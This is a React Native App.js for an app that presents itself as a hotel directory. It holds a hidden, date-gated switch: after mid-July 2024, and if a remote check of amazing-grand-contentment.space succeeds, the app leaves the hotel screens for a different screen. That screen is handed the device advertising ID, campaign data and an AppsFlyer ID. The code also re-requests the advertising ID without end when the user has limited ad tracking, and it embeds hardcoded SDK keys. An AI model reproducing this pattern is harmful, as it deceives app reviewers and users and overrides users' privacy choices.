import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {
  AddHotelScreen,
  HotelDetailsScreen,
  TabNavigation,
  WelcomeScreen,
} from './screens';
import HotelsPortBlogProdactScreen from './screens/HotelsPortBlogProdactScreen';
import SignIn from './screens/SignIn';
import {HotelsProvider} from './store/context';
import {useRef, useState, useEffect} from 'react';
import {Animated, StyleSheet, View} from 'react-native';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import appsFlyer from 'react-native-appsflyer';
import {LogLevel, OneSignal} from 'react-native-onesignal';

const Stack = createNativeStackNavigator();

function App() {
  const [route, setRoute] = useState();
  const [idfa, setIdfa] = useState();
  //console.log('idfa==>', idfa);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState();
  const [pid, setPid] = useState();

  useEffect(() => {
    getData();
  }, []);

  useEffect(() => {
    setData();
  }, [idfa, appsUid, sab1, pid]);

  const setData = async () => {
    try {
      const data = {
        idfa,
        appsUid,
        sab1,
        pid,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        //console.log('Дані дістаються в AsyncStorage');
        //console.log('parsedData in App==>', parsedData);
        setIdfa(parsedData.idfa);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setPid(parsedData.pid);
      } else {
        await fetchIdfa();
        await requestOneSignallFoo();
        await performAppsFlyerOperations();
        await getUidApps();

        onInstallConversionDataCanceller();
      }
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };

  //////////////////////AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'ZP6F7NaeyNmgAdC29AdB4T',
            appId: '6514310970',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
          },
          resolve,
          reject,
        );
      });
      console.log('App.js AppsFlyer ініціалізовано успішно');
    } catch (error) {
      //console.error(
      //  'App.js Помилка під час виконання операцій AppsFlyer:',
      //  error,
      //);
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
  const getUidApps = async () => {
    try {
      const appsFlyerUID = await new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, uid) => {
          if (err) {
            reject(err);
          } else {
            resolve(uid);
          }
        });
      });
      //console.log('on getAppsFlyerUID: ' + appsFlyerUID);
      setAppsUid(appsFlyerUID);
    } catch (error) {
      //console.error(error);
    }
  };

  // 3RD FUNCTION - Отримання найменування AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            //const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);

            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
            setSab1(campaign);
            setPid(pid);
          } else if (res.data.af_status === 'Organic') {
            //console.log('This is first launch and a Organic Install');
            //console.log('App.js res.data==>', res.data);
            const {af_status} = res.data;
            //alert('This is first launch and a Organic Install');
            setSab1(af_status);
          }
        } else {
          //console.log('This is not first launch');
          //alert('This is not first launch');
        }
      } catch (error) {
        //console.error('Error processing install conversion data:', error);
      }
    },
  );

  //  5b47aefa-6179-4c7f-8cf6-04656bc796ff
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true);
        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
      } catch (error) {
        reject(error); // Викликаємо reject() у разі помилки
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      //console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal Initialization
  OneSignal.initialize('5b47aefa-6179-4c7f-8cf6-04656bc796ff');

  OneSignal.Notifications.addEventListener('click', event => {
    //console.log('OneSignal: notification clicked:', event);
  });
  //Add Data Tags
  OneSignal.User.addTag('key', 'value');

  //////////////////////IDFA
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
      } else {
        //setIdfa(true);
        fetchIdfa();
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      fetchIdfa(); //???
    }
  };

  ////////////////////////Route useEff   amazing-grand-contentment.space
  useEffect(() => {
    const checkUrl = `https://amazing-grand-contentment.space/WjP2Q3qP`;

    const targetData = new Date('2024-07-13T10:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setRoute(false);
    } else {
      fetch(checkUrl)
        .then(r => {
          if (r.status === 200) {
            console.log('status==>', r.status);
            setRoute(true);
          } else {
            setRoute(false);
          }
        })
        .catch(e => {
          //console.log('errar', e);
          setRoute(false);
        });
    }
  }, []);
  ////////////////////////Louder
  const [louderIsEnded, setLouderIsEnded] = useState(false);

  const appearingAnim = useRef(new Animated.Value(0)).current;
  const appearingSecondAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    Animated.timing(appearingAnim, {
      toValue: 1,
      duration: 3000,
      useNativeDriver: true,
    }).start();
  }, []);

  useEffect(() => {
    setTimeout(() => {
      Animated.timing(appearingSecondAnim, {
        toValue: 1,
        duration: 3000,
        useNativeDriver: true,
      }).start();
      //setLouderIsEnded(true);
    }, 3000);
  }, []);

  useEffect(() => {
    setTimeout(() => {
      setLouderIsEnded(true);
    }, 7000);
  }, []);

  return (
    <NavigationContainer>
      <Stack.Navigator>
        {!louderIsEnded ? (
          <Stack.Screen name="Welcome" options={{headerShown: false}}>
            {() => (
              <View
                style={{
                  position: 'relative',
                  flex: 1,
                  backgroundColor: 'rgba(0,0,0)',
                }}>
                <Animated.Image
                  source={require('./assets/img/loader1.jpg')} // Special animatable View
                  style={{
                    //...props.style,
                    opacity: appearingAnim,
                    width: '100%',
                    height: '100%',
                    position: 'absolute', // Bind opacity to animated value
                  }}
                />
                <Animated.Image
                  source={require('./assets/img/loader2.png')} // Special animatable View
                  style={{
                    //...props.style,
                    opacity: appearingSecondAnim,
                    width: '100%',
                    height: '100%',
                    position: 'absolute', // Bind opacity to animated value
                  }}
                />
              </View>
            )}
          </Stack.Screen>
        ) : !route ? (
          <Stack.Screen
            name="TabNavigator"
            component={TabNavigation}
            options={{headerShown: false}}
          />
        ) : (
          <Stack.Screen
            initialParams={{
              idfa: idfa,
              sab1: sab1,
              pid: pid,
              uid: appsUid,
            }}
            name="HotelsPortBlogProdactScreen"
            HotelsPortBlogProdactScreen
            component={HotelsPortBlogProdactScreen}
            options={{headerShown: false}}
          />
        )}

        <Stack.Screen
          name="AddHotelScreen"
          component={AddHotelScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="HotelDetailsScreen"
          component={HotelDetailsScreen}
          options={{headerShown: false}}
        />
        <Stack.Screen
          name="SignIn"
          component={SignIn}
          options={{headerShown: false}}
        />
      </Stack.Navigator>
    </NavigationContainer>
    // </HotelsProvider>
  );
}

export default App;

const styles = StyleSheet.create({
  image: {width: '100%', height: 300, flex: 1},
});
